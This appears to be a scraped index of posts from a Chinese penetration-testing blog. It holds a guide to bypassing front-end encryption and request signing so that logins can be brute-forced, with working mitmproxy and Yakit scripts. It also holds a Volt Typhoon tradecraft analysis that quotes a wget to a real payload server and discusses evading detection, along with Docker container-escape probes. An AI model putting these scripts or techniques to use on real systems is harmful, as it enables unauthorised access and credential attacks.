encstr:encstr, sign:sign ; resolve(res);) 测试 这样我们就可以一次性获取所有请求的需求了 3. 构建MITM 之前介绍过Mitmproxy , 就是python版的burpsuite, 所以我们只需要知道核心的代码逻辑: 即提取原始请求体后, 向请求头中添加requestId, timestamp, sign字段 并且 替换原始请求体为加密后的内容就OK了, 直接Chatgpt生成 其实本质也就是本地搓+远程注册 然后应对加签也有对应的处理方案 代码: import jsonimport timeimport hashlibimport uuidfrom mitmproxy import httpimport requestsimport requestsdef request(flow: http.HTTPFlow) - None: if flow.request.pretty_url.startswith(http://39.98.108.20:8085/api/): # 提取原始请求体 original_body = flow.request.content.decode(utf-8) data = group: zzz, action: req, param: original_body res = requests.post(http://127.0.0.1:12080/go,data=data) res_json = json.loads(res.text)[data] data_json = json.loads(res_json) print(data_json) # 对请求体进行加密处理（这里假设加密方法是简单的哈希） encrypted_body = data_json[encstr] # 替换请求体 flow.request.text = encrypted_body # 生成 requestId，sign 和 timestamp request_id = data_json[requestid] timestamp = data_json[timestamp] sign = data_json[sign] # 添加或替换请求头 flow.request.headers[requestId] = request_id flow.request.headers[timestamp] = str(timestamp) flow.request.headers[sign] = sign# 运行 mitmproxy 时加载这个脚本：mitmproxy -s your_script.py例:mitmproxy -p 8083 -s mitm.py 将代码运行起来后, burpsuite 的upstream 设为 mitm的监听端口 4. 测试在burpsuite中发送明文数据包, 在经过mitm处理后, 自动加密, 此时服务端再不会报错了 JS-RPC + YAKIT 热加载 在刚刚的例子里面, 我们虽然可以实现加解密, 但是毕竟数据包拐了山路十八弯, 难免优点麻烦。 有没有少拐点弯的方法呢？ 当然有啦， yakit作为国内优秀的渗透一体化工具，现在的在渗透中的使用率越来越高，相信随着国产化的普及，以后会更加流行。 还不会使用yakit的同学真的可以好好学习一下， 有的功能挺好用的。 在yakit中有一个模块叫做“web fuzzer“，有点像burpsuite中 repeater 和 intruder的结合体， 提供了数据包的重放和fuzz功能。 热加载 通过web fuzzer自带热加载功能， 通过官方对热加载的描述， 我们可以构建一段代码，在发送后自动加密， 这样就省去mitm的使用了。 热加载中自带了两个魔术方法， 分别对请求和响应自动做处理 1. 原理通过研究， 可以详细解释解释： 请求包处理： 实现beforeRequest..方法即可， 其中行参”req“为一个字节数组， 保存了完整的请求内容字节。 那么我们通过yak官方的poc库（实际就是HTTP库），提供的方法，可以做如下操作： //获取请求体requestBody = poc.GetHTTPPacketBody(req)//修改请求包中指定的请求头req = poc.ReplaceHTTPPacketHeader(req, 请求头名, 请求头值)//修改请求体req = poc.ReplaceHTTPPacketBody(req, 修改后的值) 2. 实现首先我们需要准备好, 解密后的请求体, 可以直接把之前提到的变量n的值拿过来 完整热加载内容（JsRPC沿用上面的内容） // 定义加密函数func getEnc(data) rsp,rep,err = poc.Post(http://127.0.0.1:12080/go,poc.replaceBody(group=zzzaction=reqparam=+data, false),poc.appendHeader(content-type, application/x-www-form-urlencoded)) if(err) return(err) return json.loads(rsp.GetBody())[data]// beforeRequest 允许发送数据包前再做一次处理，定义为 func(origin []byte) []bytebeforeRequest = func(req) //获取请求体 req_body = poc.GetHTTPPacketBody(req) //加密 res = getEnc(string(req_body)) //获取其他的参数 res = json.loads(res) //修改其他的请求头 req = poc.ReplaceHTTPPacketHeader(req, requestId, res[requestid]) req = poc.ReplaceHTTPPacketHeader(req, timestamp, res[timestamp]) req = poc.ReplaceHTTPPacketHeader(req, sign, res[sign]) //修改请求体 req = poc.ReplaceHTTPPacketBody(req, res[encstr]) return []byte(req)// afterRequest 允许对每一个请求的响应做处理，定义为 func(origin []byte) []byteafterRequest = func(rsp) return []byte(rsp)// mirrorHTTPFlow 允许对每一个请求的响应做处理，定义为 func(req []byte, rsp []byte, params map[string]any) map[string]any// 返回值回作为下一个请求的参数，或者提取的数据，如果你需要解密响应内容，在这里操作是最合适的mirrorHTTPFlow = func(req, rsp, params) return params 最后通过fuzz功能测试暴力破解，爆破成功","tags":["JS","Re"],"categories":["research"]},{"title":"身份隐藏_无痕系列(2)","path":"/posts/a27ef720/","content":"Volt Typhoon攻击剖析：LOTL与前期隐蔽的艺术援引:Volt Typhoon 利用“离地生存”技术攻击美国关键基础设施 援引：Volt Typhoon Compromises 30% of Cisco RV320325 Devices in 37 Days 援引:Threat Brief: Attacks on Critical Infrastructure Attributed to Insidious Taurus (Volt Typhoon) 援引:Will the Real Salt Typhoon Please Stand Up? 援引:cisa Volt Typhoon Report LOTL参考:LOLBAS 前言在APT攻击的演进史中，我们见证了从”重装甲”到”轻骑兵”的战术转变。Volt Typhoon作为这一转变的典型代表，为我们展示了现代高级持续性威胁的新范式：不依赖复杂恶意代码，而是精通”借力打力”的艺术。 本文将深入解析Volt Typhoon的完整攻击体系，**从其标志性的LOTL（Living Off The Land）技术出发，延展到身份滥用、代理隐匿、长期潜伏等核心战术。**同时毕竟是21-24年左右的攻击手法，援引文章也给出了防御方案与具体排查思路，笔者认为亦可以针对给出的方案与排查思路，挖掘更多具有价值的触发点以规避检测。 “草木有本心平常，侠亦折取作剑歌”——系统自带的工具本心平常，但一旦被巧妙运用，便成了最难察觉的武器。 一句话评价Volt Typhoon 的特色就是 “不写恶意代码，做影子管理员” —— 他们把存在感压到最低，只在身份体系和合法工具里打转，靠“像合法运维一样”的行为实现渗透与控制。 VoltTypoon简介身份：某国家级APT组织，活动溯源至少 2017 起，目标以 关键基础设施 为主（通信、能源、交通、海事、政府等）。 目的：情报收集、持久潜伏、战时破坏预置。 特殊之处：几乎不使用自研木马恶意样本，最大限度地降低“特征暴露”，靠 合法工具 + 有效账号 实现持久控制，OPSEC 水平极高。 手法小结（OPSEC 核心技巧） Living off the Land (LOTL) 大量调用系统自带工具：wmic、netsh、schtasks、powershell、certutil、rundll32 等。 通过父子进程链和命令行参数混淆常见恶意行为，让检测难度骤增。 凭证与身份滥用 窃取或暴力获取有效账户，横向移动全靠“合法凭证”。 偏好使用 域用户、服务账号，避免 drop 明显的 implant。 利用身份体系（AD、Azure Entra ID、OAuth token）来做持久化与横向。 代理链与出网隐匿 借助 受感染的 SOHO 路由器、边缘设备搭建代理网络。 通信流量伪装成普通用户流量，且跨多个跳点，最终出口可能落在住宅 IP 段。 C2 模式倾向 低带宽、长连接、非高频交互，降低告警。 长期潜伏与静默策略 行为非常“节制”：只在有需要时触发动作，避免异常高频命令。 横向时优先依赖管理协议（SMBWMIWinRMRDP），最大限度靠“看似正常”的管理员操作。 在目标内部维持 数月乃至数年 不被发现。 Volt Typhoon 行为建模Volt Typhoon 自 2021 年中以来一直活跃，其目标是关岛及美国其他地区的关键基础设施组织。此次攻击活动中，受影响的组织涵盖通信、制造、公用事业、交通运输、建筑、海事、政府、信息技术和教育等行业。观察到的行为表明，威胁行为者意图进行攻击活动，并尽可能长时间地保持访问权限而不被发现。 有关 Volt Typhoon 的信息，包括其针对关键基础设施提供商的攻击活动，以及其实现和维持未经授权访问目标网络的策略。由于此活动依赖于有效帐户和“离地攻击”（LOLBins），因此检测和缓解此类攻击可能颇具挑战性。被盗用的帐户必须关闭或更改。 为了实现目标，威胁行为者在此次活动中非常注重隐蔽性，几乎完全依赖于 “离地攻击”技术和实际操作。他们通过命令行发出命令以用于 (1) 收集数据，包括来自本地和网络系统的凭证； (2) 将数据存入存档文件，以便进行数据泄露； (3) 使用窃取的有效凭证保持持久性。 此外，Volt Typhoon 还试图通过将流量路由到受感染的小型办公室和家庭办公室 (SOHO) 网络设备（包括路由器、防火墙和 VPN 硬件）来混入正常的网络活动。此外，据观察，他们还使用自定义版本的开源工具通过代理建立命令与控制 (C2) 通道，以进一步降低其隐蔽性。 攻击向量示意图 战前准备Volt Typhoon 会在入侵前进行广泛的侦察，以了解目标组织的网络架构和操作协议。侦察工作包括识别网络拓扑、安全措施、典型用户行为以及关键网络和 IT 人员。Volt Typhoon 攻击者收集的情报可能会被用来增强其运营安全性。例如，在某些情况下，Volt Typhoon 攻击者可能避免在正常工作时间以外使用已泄露的凭证， 以避免触发异常账户活动的安全警报。 根据行业报告，Volt Typhoon 攻击者**使用 FOFA、Shodan 和 Censys 查询或搜索暴露的基础设施。**在某些情况下，美国情报机构观察到 Volt Typhoon 攻击者在入侵后会将关键网络和 IT 员工的个人电子邮件作为攻击目标。 初始访问Volt Typhoon 通过暴露在公网的 Fortinet FortiGuard 设备初步获得了对目标组织的访问权限。Maybe(0day泄露口令) 。在后续操作中Volt Typhoon 利用被攻陷的 SOHO 网络边缘设备（包括路由器)构成了一个僵尸网络，通过这些设备进行代理，Volt Typhoon 增强了其运营的隐蔽性并降低了获取基础设施的管理成本 安全公司在扫描前面提到的僵尸网络中的一些思科路由器时发现，这些设备的配置残留里有执行过的 wget 命令，指向一个恶意 IP 地址 45.11.92[.]176，并下载运行了一个叫 fy.sh 的脚本。后续分析确认，这个 IP 曾经是 Volt Typhoon 的有效载荷服务器。 对载荷服务器的流量样本进一步提取分析，可以确定Vault Typhoon 利用即将到达年限的SOHO，Draytek等网络边缘设备作为肉鸡网络作为大跳板代理所有流量 入侵后的活动一旦 Volt Typhoon 进入目标环境，他们就会开始通过命令行进行实际操作。其中一些命令似乎是探索性或实验性的，因为操作员会反复调整和执行这些命令。 Volt Typhoon 在入侵后活动中很少使用恶意软件。相反，他们依靠“离地攻击”命令来查找系统信息、发现网络上的其他设备并窃取数据。我们将在以下章节中描述他们的活动，包括与凭证访问相关的最具影响力的操作。 Volt Typhoon的隐秘性实现，一项关键策略**包括使用 PowerShell 对 Windows 事件日志执行定向查询，重点关注特定用户和时间段。这些查询有助于将安全事件日志谨慎提取到 .dat 文件中，**从而使 Volt Typhoon 攻击者能够在最大限度地降低检测风险的同时收集关键信息。这种策略将深入的入侵前侦察与细致的入侵后情报收集相结合，凸显了他们复杂而战略性的网络行动方法。 Volt Typhoon 至少使用以下 LOTL 工具和命令来获取系统信息、网络服务、组和用户发现技术： 这个思维和Micro8大佬的目标文件拓宽信息收集有异曲同工之妙 凭证提取与访问如果 Volt Typhoon 从 Fortinet 设备中窃取的帐户具有特权访问权限，他们会使用该帐户执行以下凭据访问活动。 微软已观察到 Volt Typhoon 试图通过本地安全机构子系统服务 (LSASS) 转储凭据。LSASS 进程内存空间包含当前用户操作系统 (OS) 凭据的哈希值。 在LOLBAS中 也有提供类似的攻击向量Payload comsvcs.dll dump命令原文 解码后 Ntdsutil.exe 创建 ntds.ditVolt Typhoon 还经常尝试使用命令行工具 *Ntdsutil.exe* **从域控制器（远程或本地）创建安装介质。**这些介质旨在用于安装新的域控制器 。安装介质中的文件包含用户名和密码哈希值，威胁行为者可以离线破解这些哈希值，从而获得有效的域帐户凭据，以便在失去访问权限后重新获得受感染组织的访问权限。 远程 本地 MRC分析内存数据据情报显示，Volt Typhoon还会使用合法的非本地网络管理和取证工具。例如，据观察，Volt Typhoon 攻击者在域控制器上使用 Magnet RAM Capture (MRC) 1.20 版。MRC 是一款免费的映像工具，可以捕获计算机的物理内存，Volt Typhoon 攻击者很可能使用它来分析内存数据，以获取敏感信息（例如凭证）和通常无法在磁盘上访问的传输中数据。 使用 VSS 卷影副本远程提取 ntds.dit为了获得 NTDS.dit，观察到 Volt Typhoon： 使用具有域管理员权限的受损帐户 ，通过交互式 RDP 会话横向移动到域控制器； 执行 Windows 原生的 vssadmin命令创建卷影副本； 使用 Windows 管理规范控制台 (WMIC) 命令 执行 ntdsutil (一个 LOTL 实用程序)，从卷影副本中复制 NTDS.dit 和 SYSTEM 注册表配置单元 窃取 NTDS.dit 和 SYSTEM 注册表配置单元以离线破解密码 。注意：卷影副本包含指定卷上所有文件和文件夹的副本。在 DC 上创建的每个卷影副本都包含其 NTDS.dit 和 SYSTEM 注册表配置单元，后者提供解密 NTDS.dit 文件的密钥。 探测行为**微软观察到 Volt Typhoon 会发现系统信息，包括文件系统类型、驱动器名称、大小和可用空间、正在运行的进程以及开放网络。**他们还会尝试使用 PowerShell、Windows 管理规范命令行 (WMIC) 和 ping 命令来发现受感染网络上的其他系统。在少数情况下，威胁行为者会运行系统检查，以确定其是否在虚拟化环境中运行。 转储除了操作系统和域凭据外，Volt Typhoon 还会转储本地 Web 浏览器应用程序中的信息。微软还观察到威胁行为者将收集到的数据暂存在受密码保护的档案中。 C2在大多数情况下，Volt Typhoon 会像授权用户一样，使用有效凭证登录来访问受感染的系统。然而，在少数情况下，微软观察到 Volt Typhoon 的操作员会在受感染的系统上创建代理以方便访问。他们使用内置的 netsh portproxy 命令来实现这一点。 在极少数情况下，他们还使用开源工具 Impacket 和快速反向代理 (FRP) 的定制版本通过代理建立 C2 通道。 总结Volt Typhoon的LOTL攻击艺术为我们展示了现代APT组织的演进方向：从”有形”到”无形”，从”对抗”到”融入”。 他们的成功不在于技术的复杂性，而在于战术的简约性——放弃自研恶意代码的”重装甲”，选择系统原生工具的”轻骑兵”；抛弃暴力对抗的”正面战场”，转向身份滥用的”游击战术”。这种以正合，以奇胜的思路，让传统基于特征检测的防御体系显得力不从心。 Volt Typhoon的成功公式可以概括为：LOTL技术 + 身份滥用 + 肉鸡隐匿 + 静默潜伏。他们证明了一个重要观点：在攻防博弈中，”无形”往往比”有形”更具威胁性。","tags":["APT","身份隐藏"],"categories":["research"]},{"title":"一些时报","path":"/posts/afb5c91c/","content":"初衷援引：[THM]Red Team Threat Intel(红队威胁情报)-红队 受此启发 决心搭建一个有用的威胁情报狩猎机制，用于接轨日新月异的网络对抗生态 同时也是拓宽自己的选择吧 除了日站之外 一定还有能激发自己兴趣的 愿意一直做下去的内容 想跳出舒适圈接触一些更新的东西 会持续更新的 慢慢添加一些感兴趣的 有价值的内容 RSSAPT 与威胁情报类 RSShttps://securelist.com/feed/ # Kaspersky Securelist（APT研究密集）。来源见Securelist与ThreatConnect汇总。 :contentReference[oaicite:0]index=0https://blog.google/threat-analysis-group/rss # Google TAG（国家级威胁/0day生态）。来源见Google与汇总。 :contentReference[oaicite:1]index=1https://cloudblog.withgoogle.com/topics/threat-intelligence/rss # Google Cloud/Mandiant TI专栏。 :contentReference[oaicite:2]index=2https://www.mandiant.com/resources/blog/rss.xml # Mandiant 博客RSS（APT/入侵链深度）。 :contentReference[oaicite:3]index=3https://www.microsoft.com/security/blog/feed/ # Microsoft Secure（APT、云身份、企业级漏洞）。 :contentReference[oaicite:4]index=4https://msrc.microsoft.com/blog/feed/ # MSRC（微软产品安全通告/深度分析）。 :contentReference[oaicite:5]index=5https://www.welivesecurity.com/feed/ # ESET WeLiveSecurity（APT与恶意代码调查）。 :contentReference[oaicite:6]index=6https://unit42.paloaltonetworks.com/feed/ # Palo Alto Networks Unit 42（APT/入侵面趋势）。*若客户端无法发现，可退订用主站博客feed*。 :contentReference[oaicite:7]index=7https://blog.talosintelligence.com/feeds/posts/default?alt=rss # Cisco Talos（威胁情报/漏洞利用追踪）。 :contentReference[oaicite:8]index=8https://www.proofpoint.com/us/rss-feeds/blog-feed.xml # Proofpoint Threat Insight（鱼叉与TA家族）。 :contentReference[oaicite:9]index=9 漏洞预警类 RSS（高危、被利用优先）https://www.cisa.gov/cybersecurity-advisories/ics-advisories.xml # CISA 工控ICS通告（全球影响力高）。 :contentReference[oaicite:10]index=10https://www.cisa.gov/cybersecurity-advisories/ics-medical-advisories.xml # CISA 医疗ICS通告。 :contentReference[oaicite:11]index=11https://isc.sans.edu/rssfeed_full.xml # SANS Internet Storm Center（热点威胁/在野利用观测）。 :contentReference[oaicite:12]index=12https://github.com/CryptoGenNepal/CVE-KEV-RSS # 社区维护的“CISA KEV” RSS镜像（官方KEV现偏向邮件推送，此处替代）。 :contentReference[oaicite:13]index=13 补充说明（别被坑）： CISA KEV官方近月调整了更新机制，官方RSS时好时坏，更稳的是邮箱GovDelivery；上面给的是社区可靠镜像以便自动化使用 NVD当前主推 JSON 数据源（不是RSS）。做自动化筛选（CVSS≥9含“exploited”标签）请走其数据接口。 SubReddithttps://www.reddit.com/r/cybersecurity/https://www.reddit.com/r/netsec/https://www.reddit.com/r/hacking/https://www.reddit.com/r/crypto/https://www.reddit.com/r/AskNetsec/https://www.reddit.com/r/Information_Security/https://www.reddit.com/r/Malware/https://www.reddit.com/r/ReverseEngineering/https://www.reddit.com/r/Pentesting/https://www.reddit.com/r/cyber_security/https://www.reddit.com/r/CyberSecurityAdvice/https://www.reddit.com/r/ComputerSecurity/https://www.reddit.com/r/SecurityAnalysis/https://www.reddit.com/r/netsecstudents/https://www.reddit.com/r/threatintel/https://www.reddit.com/r/blueteamsec/https://www.reddit.com/r/redteamsec/https://www.reddit.com/r/SCADA/https://www.reddit.com/r/digitalforensics/https://www.reddit.com/r/phishing/https://www.reddit.com/r/WindowsSecurity/https://www.reddit.com/r/macOSsecurity/https://www.reddit.com/r/Android_Security/https://www.reddit.com/r/chromeos/https://www.reddit.com/r/OSINT/https://www.reddit.com/r/Cybersecurity101/https://www.reddit.com/r/Hacking_Tutorials/https://www.reddit.com/r/CyberSecurityJobs/https://www.reddit.com/r/CybersecurityMemes/ 安全研究员https://adsecurity.org/https://blog.harmj0y.net/https://enigma0x3.net/https://doublepulsar.com/https://github.com/gentilkiwihttps://lock.cmpxchg8b.com/https://doublepulsar.com/https://www.schneier.com/https://danielmiessler.com/https://blog.harmj0y.net/ 较为完善的系列https://y4er.com/https://3gstudent.github.io/","tags":["‘CTI’"],"categories":["research"]},{"title":"JS对抗与逆向_基础篇","path":"/posts/92226b38/","content":"本质JS的对抗 本质无非就是开发者通过一系列加密算法防止用户恶意爆破，攻击者通过逆向，推测与实践实现自加密逻辑爆破的过程。 环境靶场：0ctDayencrypt-decrypt-vuls: 加解密逻辑漏洞靶场 (github.com) 援引：保姆级教程—前端加密的对抗（附带靶场） 手把手js逆向断点调试js逆向前端加密对抗企业SRC实战分享 网站架构关于加解密也引出许多思考，第一是实现HTTP加解密是一对一实现的吗？第二是如果把数据包加密了，那安全设备是不是也失效了，这里带着几个疑问简单了解一下加解密的实现流程。 这里以请求为例 用户输入明文消息在被JS提取后， 通过JS中定义的加密方法进行加密并制作请求包进行请求。 发送到后端后，一般来说由加解密网关进行解密后， 发送到真正提供服务的服务器上。 加解密网关本质其实就是一种反向代理，除了本身转发数据包的功能以外，还对数据包进行解密。 按照这种部署模式，有两个优势： 如果新增分布式系统， 无需重复实现加解密功能， 直接使用作为该网关的下游服务即可。 在springcloud gateway和 分布式系统之间部署安全设备， 可以检测明文流量识别攻击行为。 改包的防范先汇总一下目前流行的防止改包方式 主要是这么几个方面 1. 请求参数和路径的加密 如果原始请求是GET请求，或防止访问者获取请求路径，通常会将用户实际的请求路径和GET请求参数封装都封装为POST请求的请求体，通过加解密网关再还原为原始GET请求传入后端分布式服务上。 在APP中比较常见。 表现的形式通常为： 抓包后发现访问任何功能都是同一路径，并且请求全为密文 2. 请求体的加密 这类在纯web中最常见， 通常仅仅加密接口请求的请求体内容，但有以下几类加密问题。 使用固定密钥 — 顾名思义， 这种情况一般JS中会存储密钥， 属于最简单的一种 使用动态密钥 — JS中不存储，一般用户第一次请求后将密钥加密写入COOKIE或本地存储中， 这类加密追踪难度较大。 对称加密 — 加解密数据包内容同一套密钥 非对称加密 — 加密一套解密一套 算法 — 算法就不是特别固定了， 常见的诸如AES RSA等， 也遇到过使用国密算法或一些冷门算法。 3. 签名 签名的应用也十分广泛，app，小程序和现在许多web中均存在，签名的构成主要是以下几点 RequestId — 为了防止重放攻击, 客户端生成随机RequestId 服务端接收后保存至Redis中, 如果再次接收到此RequestID, 则视为非法请求 时间戳 — 添加时间戳的超时时间, 一旦超时, 原始数据包失效 签名本身 — 通过 requestId + 原始请求体或请求参数 + 时间戳 + 盐值合并生成哈希值 从而保证以上参数的有效性和唯一性 JS逆向需要懂得基础的JS知识，和调试方法 JS调试基础本质就是以浏览器的Devtools控制与调试js前端代码 其中里面的作用域，调用堆栈，XHR断点这三个功能需要了解认识下 一、作用域（Scope）作用域是指变量、函数和对象在代码中可访问的范围，决定了标识符（变量名、函数名）的可见性。 主要类型： 全局作用域：在所有函数和代码块之外声明的变量，在整个程序中都可访问。 函数作用域：在函数内部声明的变量，仅在该函数内部可访问。 块级作用域：由 包裹的代码块（如 if、for、while）中用 letconst 声明的变量，仅在块内可访问。 和大部分语言变量作用域概念的思路共通 二、调用堆栈（Call Stack）调用堆栈是JavaScript引擎用于管理函数调用顺序的一种数据结构（遵循“后进先出”原则）。 工作原理： 当函数被调用时，引擎会为其创建一个“执行上下文”并压入栈顶 函数执行完毕后，其执行上下文从栈顶弹出，控制权回到之前的函数。 栈顶始终是当前正在执行的函数。 三 、XHR断点（XHR Breakpoint）XHR断点是浏览器开发者工具中的一种调试功能，用于在发送AJAX请求（XMLHttpRequest 或 Fetch）时暂停代码执行，方便调试网络请求相关逻辑。 使用场景： 调试接口请求参数是否正确 查看请求发送时机和触发条件 分析请求被拦截或修改的逻辑 四、 js基础断点调试我们这里随便输入一个电话号码以及密码，直接看这个网络这里，可以看到账户输入的账户、密码都被进行了加密 其中我们常见的加密内容是md5、base64加密的，但是下面这个系统加密的一看就不是常见的加密方式 像这个，我们要是想要在我们输入账户密码的后，在传输到服务器端中可以将其加密的字段截取，然后进行分析，看看这个网站是使用什么类型进行加密的，就可以进行破解了，这就是后面我需要讲的js断点调试。 认识下这几个按钮工具 工具栏作为断点调试的操作工具，包含了 6 个按钮： 按钮 1：让代码继续执行，运行到下一个断点会中断执行，如果没有设置断点会直接运行完代码 按钮 2：跳过下一个函数调用。即不遇到函数时，执行下一步；遇到函数时，不进入函数直接执行下一步 按钮 3：跳进下一个函数上下文。即不遇到函数时，执行下一步；遇到函数时，进入函数上下文，查看函数具体内容 按钮 4：跳出当前函数调用 按钮 5：单步调试，当前断点的下一步 按钮 6：停用激活全部断点 情景1 这里直接搜索VipLoginResult接口关键字，因为我们断点调试的话需要点击web端端某个个功能点，出发我们后面打的断点才可以成功，这里我们开始点击登陆，直接请求的是这个接口，所有这里我们可以先搜索这个VipLoginResult关键词看看 直接打开源代码 ctrl+shift+f全局检索 找到这个有关登陆功能处的代码，然后打断点 点击登陆按钮，就可以成功执行断点了，右边那个按钮就是执行到下一个断点 可以看到图中，代码断点运行成功了，在控制台输入logindata，就可以显示对应的加密数据了（手机号、密码） 情景2老规矩还是直接输入**手机号和密码，然后看F12中的网络数据包，**可以看到这里的密码也是进行了加密 找到登陆口附近的js代码，寻找publickey关键字 这里先随机设置一个断点 设置好断点后，点击登录，即可触发断点，进行 js 断点的调试。 可以看到点击完登陆，出现了这个功能 常见的js逆向加密搜索关键字： encryptencryptedDatasetPublicKeypublicKey 直接进行js断点调试，在控制台输入dataJson.password，就可以看到密码的js加密数据 情景3标签断点法 F12，然后点击1，然后把鼠标选中2（登陆功能上） 然后右键选中“登陆”标签，将子树修改，和属性修改都勾选上。然后我们随便输入一个账号密码点击登录 这样就可以成功 把运行的js代码给断下来了，但是目前这个网站今天写文章的时候已经找不到加密函数了，可能是已经修复了这个系统 五、针对算法对症下药AES固定Key第一种比较简单，key和iv写死，抓包发现数据传输被加密了 这里直接定位搜索“encryptedData”加密字段定位到算法位置 简单的分析，就是一个固定key 和iv 的aes加密，直接还原明文数据 username:admin,password:123456 这里阐述一个解密工具 autoDecoder 工具下载链接：https://github.com/f0ng/autoDecoder 使用教程 AES服务端获取keykey和iv没有写在前端，直接使用bp抓包即可 这里使用bp插件autoDecoder，先配置自带的方法，红框的配置要注意配置好 主页面配置，仅登录所以关键字写了password 然后进入intruder进行爆破登录尝试 成功爆破 非对称加密-RSA 加解密如何快速判定 RSA 呢？ RSA 只能加密短小的数据，如果数据太大，会直接报错，因此可以入超长数值，看看是否报错！ 提示了这个错误，显示加密失败，说明就是非对称加密- RSA加密了 对于非对称加密，他需要设置公钥，因此一般全局搜索： setpublickey、encrypt Sign 签名校验绕过直接使用bp抓包，数据包的参数如下：username、password、nonce、timestamp、signature 演示下这个signature参数的由来 登陆界面，密码输入1234567，返回包提示密码错误 这个靶场的密码是123456，那么在bp数据包中，直接这里就把密码修改成123456，看看返回包 显示signature校验不正确，因为前面username、password、nonce、timestamp参数会生成signature传入到后台，后台就回和我们这里输入到signature进行匹配，要是不一样，就会进行报错 搜索关键字：signature，去断点看js代码 function sendDataWithNonce(url) const username = document.getElementById(username) .value; const password = document.getElementById(password) .value; const nonce = Math.random() .toString(36) .substring(2); const timestamp = Math.floor(Date.now() / 1000); const secretKey = be56e057f20f883e; const dataToSign = username + password + nonce + timestamp; const signature = CryptoJS.HmacSHA256(dataToSign, secretKey) .toString(CryptoJS.enc.Hex); 那么直接根据datatoSign拼接出data字符串+ 使用CryptoJS库的HmacSHA256方法，用secretKey（be56e057f20f883e）对拼接后的字符串进行 HMAC-SHA256 加密，生成signature（签名） 再替换回到数据包中即可成功登陆了","tags":["JS","Re"],"categories":["research"]},{"title":"云渗透系列-Docker(2)","path":"/posts/6943f774/","content":"Docker逃逸_先锋性探测如果想要一把梭:检测脚本+一键日 判断是否为容器环境大部分情景可以使用下面这个命令 cat /proc/1/cgroup | grep -qi docker echo Is Docker || echo Not Docker 回显 “Is Docker”则代表当前为Docker环境 更详细的判断援引：云上攻防-云原生篇Docker安全权限环境检测容器逃逸特权模式危险挂载 方式一：查询cgroup信息docker中： 真实主机上： 方式二：检查.dockerenv文件通过判断根目录下的 .dockerenv文件是否存在，可以简单的识别docker环境 docker中： 真实主机上： 不过有一点需要注意的是，如果你获取的shell权限过小的话(www-data、或是某一服务的用户)，根目录下也是不存在.dockerenv文件的 方式三：检查mount信息利用mount查看挂载磁盘是否存在docker相关信息。 docker中： 真实主机上： 方式四：查看硬盘信息fdisk -l 容器输出为空，非容器有内容输出。 docker中： 真实主机上： 方式五：查看文件系统以及挂载点df -h 检查文件系统挂载的目录，也能够简单判断是否为docker环境。 df -h | egrep (overlay|aufs) docker中： 真实主机上： docker容器逃逸攻击面检测援引：容器逃逸方法检测指北 在开始之前对于容器逃逸主要有以下三种方法： 不安全的配置 相关程序漏洞 内核漏洞 不安全的配置特权模式执行以下命令，如果返回 Is privileged mode 则说明当前是特权模式，反之置否 由于用户为了某些业务，图方便不划分权限组所做的危险挂载，这时容器内的root权限等同于宿主机的root权限 cat /proc/self/status | grep -qi 0000003fffffffff echo Is privileged mode || echo Not privileged mode 挂载 Docker Socket执行以下命令，如果返回 Docker Socket is mounted. 说明当前挂载了 Docker Socket（守护进程） 当一个容器被授权访问 Docker Socket 时，它实际上获得了与宿主机上的 Docker 守护进程进行通信的能力。这意味着，容器内的进程可以扮演 Docker 客户端的角色，向宿主机上的 Docker 守护进程发送任何 Docker 命令。 ls /var/run/ | grep -qi docker.sock echo Docker Socket is mounted. || echo Docker Socket is not mounted. 挂载 procfsprocfs（Process File System）是一个虚拟文件系统，由 Linux 内核动态生成。它以文件和目录的形式提供了关于系统和进程的实时信息。例如： 当一个容器**挂载了宿主机的 /proc 目录时，容器内的进程就可以读取甚至修改宿主机的内核参数和进程信息。**这可能导致敏感信息泄露以及一系列间接的影响 find / -name core_pattern 2/dev/null | wc -l | grep -q 2 echo Procfs is mounted. || echo Procfs is not mounted. 挂载宿主机根目录执行以下命令，如果返回 Root directory is mounted. 则说明宿主机目录被挂载 挂载宿主机根目录等同于将宿主机的整个文件系统暴露给容器。一旦攻击者控制了这样的容器，就相当于获得了宿主机的 root 权限，容器的隔离性完全失效。这是 Docker 容器安全中最危险的配置之一。 find / -name passwd 2/dev/null | grep /etc/passwd | wc -l | grep -q 7 echo Root directory is mounted. || echo Root directory is not mounted. 如果返回 Root directory is not mounted. 则说明没有挂载 Docker remote api 未授权访问执行以下命令，如果返回 Docker Remote API Is Enabled. 说明目标存在 Docker remote api 未授权访问 Docker Remote API 允许通过 HTTP 协议远程管理 Docker 守护进程。如果这个 API 没有经过适当的认证和授权就暴露在网络上（通常监听在 2375 端口），就会导致未授权访问漏洞，其影响与挂载 Docker Socket 类似，甚至更广。 一旦攻击者通过未授权的 Docker API 创建了特权容器并逃逸，他们就可以在宿主机上执行任意代码，窃取数据，植入后门，甚至完全破坏系统。 攻击者可以停止所有运行的容器，导致服务中断。 攻击者可能利用受感染的宿主机进行挖矿、DDoS 攻击、僵尸网络等恶意活动。 IP=`hostname -i | awk -F. print $1 . $2 . $3 .1 ` timeout 3 bash -c echo /dev/tcp/$IP/2375 /dev/null 21 echo Docker Remote API Is Enabled. || echo Docker Remote API is Closed. 内核漏洞CVE-2016-5195 DirtyCow 逃逸执行 uname -r 命令，如果在 2.6.22 版本 4.8.3 之间说明可能存在 CVE-2016-5195 DirtyCow 漏洞。 CVE-2020-14386执行 uname -r 命令，如果在 4.6 版本 5.9 之间说明可能存在 CVE-2020-14386 漏洞。 CVE-2022-0847 DirtyPipe 逃逸执行 uname -r 命令，如果在 5.8 版本 5.10.102 版本 5.15.25 版本 5.16.11 之间说明可能存在 CVE-2022-0847 DirtyPipe 漏洞 漏洞利用详细的漏洞利用可以去补wiki系列和这篇文章 剩下的不做详细叙述","tags":["Cloud"],"categories":["penetration"]},{"title":"云渗透系列-Docker(1)","path":"/posts/426ea4b7/","content":"名词介绍容器援引：T Wiki Docker 容器与虚拟机类似，但二者在原理上不同，容器是将操作系统层虚拟化，虚拟机则是虚拟化硬件，因此容器更具有便携性、高效地利用服务器。 架构图如下，里面包括了 Docker 客户端、Docker 容器所在的宿主机和 Docker 镜像仓库三个部分。 其中**宿主机包括了 Docker 守护进程、本地容器和本地镜像，**Docker 守护进程（dockerd）的作用是侦听 Docker API 请求和管理 Docker 对象 容器编排容器编排是指自动化容器的部署、管理、扩展和联网，容器编排可以为需要部署和管理成百上千个 Linux 容器和主机的企业提供便利。 常见的容器编排工具方案有 Kubernetes、Docker Swarm 和 Apache Mesos 等 简明讲解二者关系：docker是什么？和kubernetes(k8s)是什么关系？ 